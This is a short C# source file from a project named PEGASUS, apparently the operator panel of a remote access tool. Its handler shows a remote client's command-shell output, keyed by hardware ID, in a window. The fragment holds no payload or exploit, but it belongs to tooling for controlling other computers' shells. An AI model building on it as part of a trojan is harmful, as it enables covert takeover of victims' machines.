using System.Windows.Forms;
using PEGASUS.Connection;
using PEGASUS.Forms;
using PEGASUS.MessagePack;

namespace PEGASUS.Handle_Packet
	{
public class HandleShell
{
	public HandleShell(MsgPack unpack_msgpack, Clients client)
	{
		FormShell formShell = (FormShell)Application.OpenForms["shell:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
		if (formShell != null)
		{
			if (formShell.Client == null)
			{
				formShell.Client = client;
				formShell.timer1.Enabled = true;
			}
			formShell.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("ReadInput").AsString);
			formShell.richTextBox1.SelectionStart = formShell.richTextBox1.TextLength;
			formShell.richTextBox1.ScrollToCaret();
		}
	}
}
}